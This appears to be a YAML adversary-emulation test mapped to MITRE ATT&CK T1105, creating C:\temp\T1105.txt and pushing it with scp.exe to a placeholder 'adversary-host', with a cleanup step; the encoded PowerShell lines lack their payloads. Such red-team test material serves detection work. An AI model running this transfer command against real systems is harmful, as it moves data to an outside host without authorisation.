- id: 084f5d6b-68ce-5f94-8f1f-5e8d659eef52
  name: Soumaia ART Tests - Windows push file using scp.exe
  description: This test simulates pushing files using SCP on a Windows environment. (requires elevation)
  tactic: command-and-control
  technique:
    attack_id: T1105
    name: Ingress Tool Transfer
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand 
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
          }
          # Check if the folder exists, create it if it doesn't
          $folderPath = "C:\temp"
          if (-Not (Test-Path -Path $folderPath)) {
              New-Item -Path $folderPath -ItemType Directory
          }

          # Create the file
          $filePath = Join-Path -Path $folderPath -ChildPath "T1105.txt"
          New-Item -Path $filePath -ItemType File -Force
          Write-Output "File created: $filePath"

          # Attack command
          scp.exe C:\temp\T1105.txt adversary@adversary-host:/tmp/
        cleanup: |-
          $filePath = Join-Path -Path "C:\temp" -ChildPath "T1105.txt"
          Remove-Item -Path $filePath -Force -erroraction silentlycontinue
          Write-Output "File deleted: $filePath"
